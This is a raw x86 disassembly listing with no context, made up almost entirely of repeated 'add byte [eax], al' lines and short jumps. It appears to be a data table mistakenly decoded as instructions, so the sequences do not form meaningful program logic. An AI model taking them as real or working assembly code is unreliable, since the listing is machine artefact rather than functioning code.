or dword [eax], eax
add dh, dh
or dword [eax], eax
add al, bh
or dword [eax], eax
add dl, bh
or dword [eax], eax
add ah, bh
or dword [eax], eax
add dh, bh
or dword [eax], eax
add byte [eax], al
or al, byte [eax]
add byte [edx], al
or al, byte [eax]
add byte [edx + ecx], al
add byte [eax], al
push es
or al, byte [eax]
add byte [eax], cl
or al, byte [eax]
add byte [edx], cl
or al, byte [eax]
add byte [edx + ecx], cl
add byte [eax], al
push cs
or al, byte [eax]
add byte [eax], dl
or al, byte [eax]
add byte [edx], dl
or al, byte [eax]
add byte [edx + ecx], dl
add byte [eax], al
push ss
or al, byte [eax]
add byte [eax], bl
or al, byte [eax]
add byte [edx], bl
or al, byte [eax]
add byte [edx + ecx], bl
add byte [eax], al
push ds
or al, byte [eax]
add byte [eax], ah
or al, byte [eax]
add byte [edx], ah
or al, byte [eax]
add byte [edx + ecx], ah
add byte [eax], al
or al, byte es:[eax]
add byte [eax], ch
or al, byte [eax]
add byte [edx], ch
or al, byte [eax]
add byte [edx + ecx], ch
add byte [eax], al
or al, byte cs:[eax]
add byte [eax], dh
or al, byte [eax]
add byte [edx], dh
or al, byte [eax]
add byte [edx + ecx], dh
add byte [eax], al
or al, byte ss:[eax]
add byte [eax], bh
or al, byte [eax]
add byte [edx], bh
or al, byte [eax]
add byte [edx + ecx], bh
add byte [eax], al
or al, byte ds:[eax]
add byte [eax + 0xa], al
add byte [eax], al
inc edx
or al, byte [eax]
add byte [edx + ecx], al
add byte [esi + 0xa], al
add byte [eax], al
dec eax
or al, byte [eax]
add byte [edx + 0xa], cl
add byte [eax], al
dec esp
or al, byte [eax]
add byte [esi + 0xa], cl
add byte [eax], al
push eax
or al, byte [eax]
add byte [edx + 0xa], dl
add byte [eax], al
push esp
or al, byte [eax]
add byte [esi + 0xa], dl
add byte [eax], al
pop eax
or al, byte [eax]
add byte [edx + 0xa], bl
add byte [eax], al
pop esp
or al, byte [eax]
add byte [esi + 0xa], bl
add byte [eax], al
pushal
or al, byte [eax]
add byte [edx + 0xa], ah
add byte [eax], al
or al, byte fs:[eax]
add byte [esi + 0xa], ah
add byte [eax], al
push 0x6a00000a
or al, byte [eax]
add byte [edx + ecx], ch
add byte [esi + 0xa], ch
add byte [eax], al
jo 0x8095b0c
add byte [eax], al
jb 0x8095b10
add byte [eax], al
je 0x8095b14
add byte [eax], al
jbe 0x8095b18
add byte [eax], al
js 0x8095b1c
add byte [eax], al
jp 0x8095b20
add byte [eax], al
jl 0x8095b24
add byte [eax], al
jle 0x8095b28
add byte [eax], al
or byte [edx], 0
add byte [edx - 0x7bfffff6], al
or al, byte [eax]
add byte [esi - 0x77fffff6], al
or al, byte [eax]
add byte [edx - 0x73fffff6], cl
or al, byte [eax]
add byte [esi - 0x5ffffff6], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [ebx], ch
add byte [eax], al
add byte [ebp], ch
add byte [eax], al
add byte [esi], ch
add byte [eax], al
add byte [ebp], dh
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [ebx], bh
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
mov ebp, 0
add byte [eax], al
add byte [esi], bh
add byte [eax], al
add dh, al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add bh, dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add bh, bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add dh, ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx + 1], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx + 1], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebx
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx + 1], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
jg 0x8095bf3
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov dword [ecx], 0
add byte [eax], al
enter 1, 0
add byte [eax], al
add byte [eax], al
leave
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add dl, cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add bl, cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add ah, cl
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add cl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add dl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add bl, dh
add dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx + eax], bh
add byte [eax], al
mov byte [edx], 0
add byte [eax], al
add byte [eax], al
add al, cl
add al, byte [eax]
add byte [eax], al
add byte [eax], al
add bl, cl
add al, byte [eax]
add byte [eax], al
add byte [eax], al
add ch, cl
add al, byte [eax]
add byte [eax], al
add byte [eax], al
add al, dl
add al, byte [eax]
add byte [eax], al
add byte [eax], al
add ah, bl
add al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add eax, 0x20
add byte [eax], al
add byte [esi], al
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], cl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], dl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
adc eax, 0x20
add byte [eax], al
add byte [eax], bl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], bl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx], bl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
sbb eax, 0x20
add byte [eax], al
add byte [esi], bl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], bl
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], ah
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
and eax, 0x20
add byte [eax], al
add byte [esi], ah
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x20], dh
add byte [eax], al
add byte [esi], dh
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], dh
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], bh
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], bh
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc edi
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax + 0x20], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi + 0x20], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x20], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound esp, qword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [eax], sp
add byte [eax], al
add byte [eax], al
add byte [eax], al
test al, 0x20
add byte [eax], al
add byte [eax], al
add byte [eax], al
lodsb al, byte [esi]
and byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], al
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx], al
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [0x21], al
add byte [eax], al
add byte [esi], al
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx], cl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
or eax, 0x21
add byte [eax], al
add byte [esi], cl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], dl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx], dl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [0x21], dl
add byte [eax], al
add byte [esi], dl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx], bl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx], bl
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
sbb eax, 0x21
add byte [eax], al
add byte [ecx], ah
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx], ah
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
and dword es:[eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], ch
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub eax, 0x21
add byte [eax], al
add byte [esi], ch
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edi], ch
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax], dh
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx], dh
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp dword [ecx], esp
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc ebp
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [esi + 0x21], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
inc edi
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [eax + 0x21], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
dec ecx
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx + 0x21], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x21], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edi + 0x21], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x21], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebx + 0x21], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esp
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x21], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esi
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edi + 0x21], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x21], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound esp, qword [ecx]
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [ecx], sp
add byte [eax], al
add byte [eax], al
add byte [eax], al
and dword fs:[eax], eax
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x21], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
and word [eax], ax
add byte [eax], al
add byte [eax], al
add byte [edi + 0x21], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0x21
add byte [eax], al
add byte [ecx + 0x21], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0x21
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul esp, dword [ecx], 0
add byte [eax], al
add byte [eax], al
add byte [ecx], ch
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x21], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edi + 0x21], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x809602b
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x8096033
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809603b
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x8096043
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809604b
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x8096053
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809605b
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x8096063
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x809606b
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x8096073
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x809607b
add byte [eax], al
add byte [eax], al
add byte [eax], al
jnp 0x8096083
add byte [eax], al
add byte [eax], al
add byte [eax], al
jl 0x809608b
add byte [eax], al
add byte [eax], al
add byte [eax], al
jge 0x8096093
add byte [eax], al
add byte [eax], al
add byte [eax], al
jle 0x809609b
add byte [eax], al
add byte [eax], al
add byte [eax], al
jg 0x80960a3
add byte [eax], al
add byte [eax], al
add byte [eax], al
nop
and dword [eax], eax
add byte [eax], al
add byte [eax], al
add byte [edx + 0x21], dl
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
shl byte [ecx], 1
add byte [eax], al
add byte [eax], al
add byte [eax], al
shl byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
aam 0x21
add byte [eax], al
add byte [eax], al
add byte [eax], al
adc ah, byte [edx]
add byte [eax], al
add byte [eax], al
add byte [eax], al
adc eax, 0x22
add byte [eax], al
add byte [esi], dl
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edi], dl
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [esi], dh
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, byte fs:[eax]
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x22], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0x22
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul esp, dword [edx], 0
add byte [eax], al
add byte [eax], al
add al, bl
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add cl, bl
and al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ecx], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edx], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ebx], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esp], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add eax, 0x24
add byte [eax], al
add byte [esi], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edi], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], cl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edx], cl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ebx], cl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esp], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
or eax, 0x24
add byte [eax], al
add byte [esi], cl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edi], cl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], dl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ecx], dl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edx], dl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ebx], dl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esp], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
adc eax, 0x24
add byte [eax], al
add byte [esi], dl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edi], dl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], bl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ecx], bl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edx], bl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ebx], bl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esp], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
sbb eax, 0x24
add byte [eax], al
add byte [esi], bl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edi], bl
and al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], ah
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ecx], ah
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ebx], ah
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esp], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x24], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
bound esp, qword [eax + eax]
add byte [eax], al
add byte [eax], al
add byte [ebx + 0x24], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x24], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edi + 0x24], ah
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0x24
add byte [eax], al
add byte [ecx + 0x24], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0x24
add byte [eax], al
add byte [eax], al
add byte [eax], al
imul esp, dword [eax + eax], 0
add byte [eax], al
add byte [eax], al
insb byte es:[edi], dx
and al, 0
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x24], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
outsb dx, byte [esi]
and al, 0
add byte [eax], al
add byte [eax], al
add byte [edi + 0x24], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo 0x80962e6
add byte [eax], al
add byte [eax], al
add byte [eax], al
jno 0x80962ee
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x80962f6
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x80962fe
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x8096306
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809630e
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x8096316
add byte [eax], al
add byte [eax], al
add byte [eax], al
ja 0x809631e
add byte [eax], al
add byte [eax], al
add byte [eax], al
js 0x8096326
add byte [eax], al
add byte [eax], al
add byte [eax], al
jns 0x809632e
add byte [eax], al
add byte [eax], al
add byte [eax], al
jp 0x8096336
add byte [eax], al
add byte [eax], al
add byte [eax], al
jnp 0x809633e
add byte [eax], al
add byte [eax], al
add byte [eax], al
jl 0x8096346
add byte [eax], al
add byte [eax], al
add byte [eax], al
jge 0x809634e
add byte [eax], al
add byte [eax], al
add byte [eax], al
jle 0x8096356
add byte [eax], al
add byte [eax], al
add byte [eax], al
jg 0x809635e
add byte [eax], al
add byte [eax], al
add byte [eax], al
and byte [eax + eax], 0
add byte [eax], al
add byte [eax], al
and dword [eax + eax], 0
add byte [edx + 0x24], al
add byte [eax], al
add byte [ebx + 0x24], al
add byte [eax], al
add byte [esp], al
add byte [eax], al
test dword [eax + eax], esp
add byte [eax], al
add byte [eax], al
add byte [esi + 0x24], al
add byte [eax], al
add byte [edi + 0x24], al
add byte [eax], al
add byte [eax + 0x24], cl
add byte [eax], al
add byte [ecx + 0x24], cl
add byte [eax], al
add byte [edx + 0x24], cl
add byte [eax], al
add byte [ebx + 0x24], cl
add byte [eax], al
add byte [esp], cl
add byte [eax], al
lea esp, [eax + eax]
add byte [eax], al
add byte [eax], al
add byte [esi + 0x24], cl
add byte [eax], al
add byte [edi + 0x24], cl
add byte [eax], al
add byte [eax + 0x24], dl
add byte [eax], al
add byte [ecx + 0x24], dl
add byte [eax], al
add byte [edx + 0x24], dl
add byte [eax], al
add byte [ebx + 0x24], dl
add byte [eax], al
add byte [esp], dl
add byte [eax], al
xchg ebp, eax
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esi + 0x24], dl
add byte [eax], al
add byte [edi + 0x24], dl
add byte [eax], al
add byte [eax + 0x24], bl
add byte [eax], al
add byte [ecx + 0x24], bl
add byte [eax], al
add byte [edx + 0x24], bl
add byte [eax], al
add byte [ebx + 0x24], bl
add byte [eax], al
add byte [esp], bl
add byte [eax], al
popfd
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esi + 0x24], bl
add byte [eax], al
add byte [edi + 0x24], bl
add byte [eax], al
add byte [eax + 0x24], ah
add byte [eax], al
add byte [ecx + 0x24], ah
add byte [eax], al
add byte [edx + 0x24], ah
add byte [eax], al
add byte [ebx + 0x24], ah
add byte [eax], al
add byte [esp], ah
add byte [eax], al
movsd dword es:[edi], dword ptr [esi]
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esi + 0x24], ah
add byte [eax], al
add byte [edi + 0x24], ah
add byte [eax], al
add byte [eax + 0x24], ch
add byte [eax], al
add byte [ecx + 0x24], ch
add byte [eax], al
add byte [edx + 0x24], ch
add byte [eax], al
add byte [ebx + 0x24], ch
add byte [eax], al
add byte [esp], ch
add byte [eax], al
lodsd eax, dword [esi]
and al, 0
add byte [eax], al
add byte [eax], al
add byte [esi + 0x24], ch
add byte [eax], al
add byte [edi + 0x24], ch
add byte [eax], al
add byte [eax + 0x24], dh
add byte [eax], al
add byte [ecx + 0x24], dh
add byte [eax], al
add byte [edx + 0x24], dh
add byte [eax], al
add byte [ebx + 0x24], dh
add byte [eax], al
add byte [esp], dh
add byte [eax], al
mov ch, 0x24
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov dh, 0x24
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov bh, 0x24
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov eax, 0x24
add byte [eax], al
add byte [ecx + 0x24], bh
add byte [eax], al
add byte [edx + 0x24], bh
add byte [eax], al
add byte [ebx + 0x24], bh
add byte [eax], al
add byte [esp], bh
add byte [eax], al
mov ebp, 0x24
add byte [eax], al
add byte [esi + 0x24], bh
add byte [eax], al
add byte [edi + 0x24], bh
add byte [eax], al
add al, al
and al, 0
add byte [eax], al
add byte [eax], al
add cl, al
and al, 0
add byte [eax], al
add byte [eax], al
add dl, al
and al, 0
add byte [eax], al
add byte [eax], al
add bl, al
and al, 0
add byte [eax], al
add byte [eax], al
add ah, al
and al, 0
add byte [eax], al
add byte [eax], al
add ch, al
and al, 0
add byte [eax], al
add byte [eax], al
add dh, al
and al, 0
add byte [eax], al
add byte [eax], al
add bh, al
and al, 0
add byte [eax], al
add byte [eax], al
add al, cl
and al, 0
add byte [eax], al
add byte [eax], al
add cl, cl
and al, 0
add byte [eax], al
add byte [eax], al
add dl, cl
and al, 0
add byte [eax], al
add byte [eax], al
add bl, cl
and al, 0
add byte [eax], al
add byte [eax], al
add ah, cl
and al, 0
add byte [eax], al
add byte [eax], al
add ch, cl
and al, 0
add byte [eax], al
add byte [eax], al
add dh, cl
and al, 0
add byte [eax], al
add byte [eax], al
add bh, cl
and al, 0
add byte [eax], al
add byte [eax], al
add al, dl
and al, 0
add byte [eax], al
add byte [eax], al
add cl, dl
and al, 0
add byte [eax], al
add byte [eax], al
add dl, dl
and al, 0
add byte [eax], al
add byte [eax], al
add bl, dl
and al, 0
add byte [eax], al
add byte [eax], al
add ah, dl
and al, 0
add byte [eax], al
add byte [eax], al
add ch, dl
and al, 0
add byte [eax], al
add byte [eax], al
add dh, dl
and al, 0
add byte [eax], al
add byte [eax], al
add bh, dl
and al, 0
add byte [eax], al
add byte [eax], al
add al, bl
and al, 0
add byte [eax], al
add byte [eax], al
add cl, bl
and al, 0
add byte [eax], al
add byte [eax], al
add dl, bl
and al, 0
add byte [eax], al
add byte [eax], al
add bl, bl
and al, 0
add byte [eax], al
add byte [eax], al
add ah, bl
and al, 0
add byte [eax], al
add byte [eax], al
add ch, bl
and al, 0
add byte [eax], al
add byte [eax], al
add dh, bl
and al, 0
add byte [eax], al
add byte [eax], al
add bh, bl
and al, 0
add byte [eax], al
add byte [eax], al
add al, ah
and al, 0
add byte [eax], al
add byte [eax], al
add cl, ah
and al, 0
add byte [eax], al
add byte [eax], al
add dl, ah
and al, 0
add byte [eax], al
add byte [eax], al
add bl, ah
and al, 0
add byte [eax], al
add byte [eax], al
add ah, ah
and al, 0
add byte [eax], al
add byte [eax], al
add ch, ah
and al, 0
add byte [eax], al
add byte [eax], al
add dh, ah
and al, 0
add byte [eax], al
add byte [eax], al
add bh, ah
and al, 0
add byte [eax], al
add byte [eax], al
add al, ch
and al, 0
add byte [eax], al
add byte [eax], al
add cl, ch
and al, 0
add byte [eax], al
add byte [eax], al
add dl, ch
and al, 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
and eax, 0
add byte [eax], al
add ah, byte [0]
add byte [eax], al
or al, 0x25
add byte [eax], al
add byte [eax], al
add byte [eax], al
adc byte [0], ah
add byte [eax], al
adc al, 0x25
add byte [eax], al
add byte [eax], al
add byte [eax], al
sbb byte [0], ah
add byte [eax], al
sbb al, 0x25
add byte [eax], al
add byte [eax], al
add byte [eax], al
and al, 0x25
add byte [eax], al
add byte [eax], al
add byte [eax], al
sub al, 0x25
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor al, 0x25
add byte [eax], al
add byte [eax], al
add byte [eax], al
cmp al, 0x25
add byte [eax], al
add byte [eax], al
add byte [eax], al
out 0x25, al
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x8096724
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x809672c
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x8096734
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov al, byte [0x30]
add byte [eax], al
add byte [ecx + 0x32], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push edx
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx + 0x32], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esp
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x32], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
push esi
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + 0x32], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop eax
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x32], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop edx
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebx + 0x32], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esp
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x32], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
pop esi
xor al, byte [eax]
add byte [eax], al
add byte [eax], al
add byte [edi + 0x32], bl
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov cl, 0x32
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov dl, 0x32
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov bl, 0x32
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov ah, 0x32
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov ch, 0x32
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov dh, 0x32
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov bh, 0x32
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov eax, 0x32
add byte [eax], al
add byte [ecx + 0x32], bh
add byte [eax], al
add byte [edx + 0x32], bh
add byte [eax], al
add byte [ebx + 0x32], bh
add byte [eax], al
add byte [edx + esi], bh
add byte [eax], al
mov ebp, 0x32
add byte [eax], al
add byte [esi + 0x32], bh
add byte [eax], al
add byte [edi + 0x32], bh
add byte [eax], al
add byte [ecx + 0x33], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
jb 0x809684d
add byte [eax], al
add byte [eax], al
add byte [eax], al
jae 0x8096855
add byte [eax], al
add byte [eax], al
add byte [eax], al
je 0x809685d
add byte [eax], al
add byte [eax], al
add byte [eax], al
jne 0x8096865
add byte [eax], al
add byte [eax], al
add byte [eax], al
jbe 0x809686d
add byte [eax], al
add byte [eax], al
add byte [eax], al
xor byte [ebx], 0
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x33], al
add byte [eax], al
add byte [edx + 0x33], al
add byte [eax], al
add byte [ebx + 0x33], al
add byte [eax], al
